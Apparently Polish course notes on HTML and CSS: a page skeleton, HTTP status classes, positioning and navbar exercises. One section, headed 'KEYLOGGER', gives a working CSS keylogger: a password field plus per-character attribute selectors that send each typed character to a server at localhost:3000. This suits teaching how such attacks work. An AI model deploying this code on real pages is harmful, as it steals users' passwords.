---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# html

SHIFT 1

```html
<! DOCTYPE html>
<html>

<head> <meta charset="UTF-8">
‹title> Main page </title> 
</head>

<body>

</body>

</html>
```

Żeby odpalić instalujemy w VSC LiveServer

HTTP responses

* Informational responses (100-199)
* Successful responses (200-299)
* Redirection messages (300-399)
* client error responses (400-499)
* Server error responses (500-599)

**KEYLOGGER**HTML

{% code fullWidth="true" %}
```html
<!DOCTYPE html> <html lang="en"> <head> <meta charset= "UTF-8">
‹meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Keylogger</title>
<link rel="stylesheet" href=".
•/ css/keylogger.css">
<script>
    function keyup(element){
      element.setAttribute("value", element.value)
    }
</script>

</head> <body>

<input type="password" onkeyup=keyup(this) value=""›

</body> </html>
```
{% endcode %}

CSS

{% code fullWidth="true" %}
```css
input[type="password"][value$=" "] { background-image: url("http://localhost:3000/+"); }
input[type="password"][value$="!"] { background-image: url("http://localhost:3000/%21"); }
input[type="password"][value$="\""] { background-image: url("http://localhost:3000/%22"); }
input[type="password"][value$="#"] { background-image: url("http://localhost:3000/%23"); }
input[type="password"][value$="$"] { background-image: url("http://localhost:3000/%24"); }
input[type="password"][value$="%"] { background-image: url("http://localhost:3000/%25"); }
input[type="password"][value$="&"] { background-image: url("http://localhost:3000/%26"); }
input[type="password"][value$="'"] { background-image: url("http://localhost:3000/%27"); }
input[type="password"][value$="("] { background-image: url("http://localhost:3000/%28"); }
input[type="password"][value$=")"] { background-image: url("http://localhost:3000/%29"); }
input[type="password"][value$="*"] { background-image: url("http://localhost:3000/%2A"); }
input[type="password"][value$="+"] { background-image: url("http://localhost:3000/%2B"); }
input[type="password"][value$=","] { background-image: url("http://localhost:3000/%2C"); }
input[type="password"][value$="-"] { background-image: url("http://localhost:3000/-"); }
input[type="password"][value$="."] { background-image: url("http://localhost:3000/."); }
input[type="password"][value$="/"] { background-image: url("http://localhost:3000/%2F"); }
input[type="password"][value$="0"] { background-image: url("http://localhost:3000/0"); }
input[type="password"][value$="1"] { background-image: url("http://localhost:3000/1"); }
input[type="password"][value$="2"] { background-image: url("http://localhost:3000/2"); }
input[type="password"][value$="3"] { background-image: url("http://localhost:3000/3"); }
input[type="password"][value$="4"] { background-image: url("http://localhost:3000/4"); }
input[type="password"][value$="5"] { background-image: url("http://localhost:3000/5"); }
input[type="password"][value$="6"] { background-image: url("http://localhost:3000/6"); }
input[type="password"][value$="7"] { background-image: url("http://localhost:3000/7"); }
input[type="password"][value$="8"] { background-image: url("http://localhost:3000/8"); }
input[type="password"][value$="9"] { background-image: url("http://localhost:3000/9"); }
input[type="password"][value$=":"] { background-image: url("http://localhost:3000/%3A"); }
input[type="password"][value$=";"] { background-image: url("http://localhost:3000/%3B"); }
input[type="password"][value$="<"] { background-image: url("http://localhost:3000/%3C"); }
input[type="password"][value$="="] { background-image: url("http://localhost:3000/%3D"); }
input[type="password"][value$=">"] { background-image: url("http://localhost:3000/%3E"); }
input[type="password"][value$="?"] { background-image: url("http://localhost:3000/%3F"); }
input[type="password"][value$="@"] { background-image: url("http://localhost:3000/%40"); }
input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }
input[type="password"][value$="B"] { background-image: url("http://localhost:3000/B"); }
input[type="password"][value$="C"] { background-image: url("http://localhost:3000/C"); }
input[type="password"][value$="D"] { background-image: url("http://localhost:3000/D"); }
input[type="password"][value$="E"] { background-image: url("http://localhost:3000/E"); }
input[type="password"][value$="F"] { background-image: url("http://localhost:3000/F"); }
input[type="password"][value$="G"] { background-image: url("http://localhost:3000/G"); }
input[type="password"][value$="H"] { background-image: url("http://localhost:3000/H"); }
input[type="password"][value$="I"] { background-image: url("http://localhost:3000/I"); }
input[type="password"][value$="J"] { background-image: url("http://localhost:3000/J"); }
input[type="password"][value$="K"] { background-image: url("http://localhost:3000/K"); }
input[type="password"][value$="L"] { background-image: url("http://localhost:3000/L"); }
input[type="password"][value$="M"] { background-image: url("http://localhost:3000/M"); }
input[type="password"][value$="N"] { background-image: url("http://localhost:3000/N"); }
input[type="password"][value$="O"] { background-image: url("http://localhost:3000/O"); }
input[type="password"][value$="P"] { background-image: url("http://localhost:3000/P"); }
input[type="password"][value$="Q"] { background-image: url("http://localhost:3000/Q"); }
input[type="password"][value$="R"] { background-image: url("http://localhost:3000/R"); }
input[type="password"][value$="S"] { background-image: url("http://localhost:3000/S"); }
input[type="password"][value$="T"] { background-image: url("http://localhost:3000/T"); }
input[type="password"][value$="U"] { background-image: url("http://localhost:3000/U"); }
input[type="password"][value$="V"] { background-image: url("http://localhost:3000/V"); }
input[type="password"][value$="W"] { background-image: url("http://localhost:3000/W"); }
input[type="password"][value$="X"] { background-image: url("http://localhost:3000/X"); }
input[type="password"][value$="Y"] { background-image: url("http://localhost:3000/Y"); }
input[type="password"][value$="Z"] { background-image: url("http://localhost:3000/Z"); }
input[type="password"][value$="["] { background-image: url("http://localhost:3000/%5B"); }
input[type="password"][value$="\\"] { background-image: url("http://localhost:3000/%5C"); }
input[type="password"][value$="]"] { background-image: url("http://localhost:3000/%5D"); }
input[type="password"][value$="^"] { background-image: url("http://localhost:3000/%5E"); }
input[type="password"][value$=""] { background-image: url("http://localhost:3000/"); }
input[type="password"][value$="`"] { background-image: url("http://localhost:3000/%60"); }
input[type="password"][value$="a"] { background-image: url("http://localhost:3000/a"); }
input[type="password"][value$="b"] { background-image: url("http://localhost:3000/b"); }
input[type="password"][value$="c"] { background-image: url("http://localhost:3000/c"); }
input[type="password"][value$="d"] { background-image: url("http://localhost:3000/d"); }
input[type="password"][value$="e"] { background-image: url("http://localhost:3000/e"); }
input[type="password"][value$="f"] { background-image: url("http://localhost:3000/f"); }
input[type="password"][value$="g"] { background-image: url("http://localhost:3000/g"); }
input[type="password"][value$="h"] { background-image: url("http://localhost:3000/h"); }
input[type="password"][value$="i"] { background-image: url("http://localhost:3000/i"); }
input[type="password"][value$="j"] { background-image: url("http://localhost:3000/j"); }
input[type="password"][value$="k"] { background-image: url("http://localhost:3000/k"); }
input[type="password"][value$="l"] { background-image: url("http://localhost:3000/l"); }
input[type="password"][value$="m"] { background-image: url("http://localhost:3000/m"); }
input[type="password"][value$="n"] { background-image: url("http://localhost:3000/n"); }
input[type="password"][value$="o"] { background-image: url("http://localhost:3000/o"); }
input[type="password"][value$="p"] { background-image: url("http://localhost:3000/p"); }
input[type="password"][value$="q"] { background-image: url("http://localhost:3000/q"); }
input[type="password"][value$="r"] { background-image: url("http://localhost:3000/r"); }
input[type="password"][value$="s"] { background-image: url("http://localhost:3000/s"); }
input[type="password"][value$="t"] { background-image: url("http://localhost:3000/t"); }
input[type="password"][value$="u"] { background-image: url("http://localhost:3000/u"); }
input[type="password"][value$="v"] { background-image: url("http://localhost:3000/v"); }
input[type="password"][value$="w"] { background-image: url("http://localhost:3000/w"); }
input[type="password"][value$="x"] { background-image: url("http://localhost:3000/x"); }
input[type="password"][value$="y"] { background-image: url("http://localhost:3000/y"); }
input[type="password"][value$="z"] { background-image: url("http://localhost:3000/z"); }
input[type="password"][value$="{"] { background-image: url("http://localhost:3000/%7B"); }
input[type="password"][value$="|"] { background-image: url("http://localhost:3000/%7C"); }
input[type="password"][value$="\\}"] { background-image: url("http://localhost:3000/%7D"); }
input[type="password"][value$=""] { background-image: url("http://localhost:3000/"); }
input[type="password"][value$=""] { background-image: url("http://localhost:3000/%7F"); }
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pozycjonowanie</title>
    <style>
            div.pudelko {
            background-color: rgb(16, 139, 139) ;
            opacity: 0.7;
            width: 100px;
            height: 100px;
            display: grid;
            align-items: center;
            border: 2px solid black;
            padding: 20px;
            margin: auto;
            margin-top: 50px;
        } 

        div.static {
            background-color: rgb(232, 177, 25) ;
            opacity: 0.7;
            width: 100px;
            height: 100px;
            display: grid;
            align-items: center;
            border: 2px solid black;
            padding: 20px;
            margin-top: 50px;
            position: static; 
        }

        div.sticky {
            background-color: rgb(53, 225, 37) ;
            opacity: 0.5;
            width: 100px;
            height: 100px;
            display: grid;
            align-items: center;
            border: 2px solid black;
            padding: 20px;
            margin-top: 50px;
            position: sticky; 
            left: 100px;
        }

        div.fixed {
                position: fixed;
                background-color: rgb(223, 21, 176);
                opacity: 0.7;
                display: grid;
                align-items: center;
                width: 100px;
                height: 100px;
                top: 200px;  
            }


    </style>
</head>
<body>
    
    <div class="pudelko">
        <span>Pudelko</span>
    </div>

    <div class="static">
        <span>Static</span>
    </div>

    <div class="sticky">
        <span>sticky</span>
    </div>


    <div class="fixed">
        <span>fixed</span>
    </div>



    <p>What is Lorem Ipsum?
        Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.  
        Where does it come from?
        Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.
        
        The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.
        
        Where can I get some?
        There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable. If you are going to use a passage of Lorem Ipsum, you need to be sure there isn't anything embarrassing hidden in the middle of text. All the Lorem Ipsum generators on the Internet tend to repeat p</p>


</body>
</html>
```
{% endcode %}

Navbar

{% code fullWidth="true" %}
```html
<nav>
    <ul>
        <li class="menu"><a href="index.html">Home</a></li>
        <li class="menu"><a href="formularz.html">Kontakt</a></li>
        <li class="menu"><a href="galeria.html">Galeria</a></li>
        <li class="menu"><a href="login.html">Logowanie</a></li>
    </ul>

</nav>
```
{% endcode %}

Z bootstrapem

{% code overflow="wrap" fullWidth="true" %}
```html
<!DOCTYPE html>
<html>
<!-- komentarz-->

<head> 
    <meta charset="UTF-8">
    <title>Tytul</title>

    <style>
        body {
            color: rgb(211, 140, 9);
            font-family: sans-serif;
            /* 1 rem = 16px */
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
        }

        .navbar {
            margin-bottom: 20px;
            position: relative;
            /* flex pozwala na dopasowywanie się elementów np. potomnych (co zobaczymy) */
            display: flex;
            /* zawijanie */
            flex-wrap: wrap;
            /* justowanie elementów */
            justify-content: space-between;
            /* domyslnie dla przegladark */
            padding: 5px 0px 5px 0px;
        }

        .navbar-brand {
            padding-top: .3125rem;
            padding-bottom: .3125rem;
            margin-right: 1rem;
            font-size: 1.25rem;
            text-decoration: none;
            white-space: nowrap;
            color: #fff;
        }

        .navbar-toggler-icon {
  display: inline-block;
  width: 1.5em;
  height: 1.5em;
  vertical-align: middle;
  background-repeat: no-repeat;
  background-position: center;
  background-size: 100%;
  display:none;
        }

        .navbar-collapse{
            display: flex;
            flex-grow: 1;
            align-items: center;
        }

        .navbar-nav{
            flex-direction: row;
            padding-left: 0;
            list-style: none;
            
        }
        .dropdown{
            position: relative;
        }

            .bg-dark {
                background-color: rgb(16, 139, 139) !important;
            }

            .container-fluid {
                width: 100%;
                display: flex;
                flex-wrap: inherit;
                align-items: center;
                justify-content: space-between;
                margin-right: auto;
                margin-left: auto;
                padding: 0px 16px 0px 16px;
            }
    </style>



</head>

<body>

    <!-- to jest navbar z bootstrapu (sprobujmy zrobic taka strone jak jest w HU) -->

    <nav class="navbar navbar-expand-sm navbar-dark bg-dark" aria-label="Third navbar example">
        <div class="container-fluid">
          <a class="navbar-brand" href="#">Expand at sm</a>
          <!-- <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsExample03" aria-controls="navbarsExample03" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button> -->
    
          <div class="collapse navbar-collapse" id="navbarsExample03">
            <ul class="navbar-nav me-auto mb-2 mb-sm-0">
              <li class="nav-item">
                <a class="nav-link active" aria-current="page" href="#">Home</a>
              </li>
              <li class="nav-item">
                <a class="nav-link" href="#">Link</a>
              </li>
              <li class="nav-item">
                <a class="nav-link disabled" href="#" tabindex="-1" aria-disabled="true">Disabled</a>
              </li>
              <li class="nav-item dropdown">
                <a class="nav-link dropdown-toggle" href="#" id="dropdown03" data-bs-toggle="dropdown" aria-expanded="false">Dropdown</a>
                <ul class="dropdown-menu" aria-labelledby="dropdown03">
                  <li><a class="dropdown-item" href="#">Action</a></li>
                  <li><a class="dropdown-item" href="#">Another action</a></li>
                  <li><a class="dropdown-item" href="#">Something else here</a></li>
                </ul>
              </li>
            </ul>
            <form>
              <input class="form-control" type="text" placeholder="Search" aria-label="Search">
            </form>
          </div>
        </div>
      </nav>


</body>

</html>
```
{% endcode %}
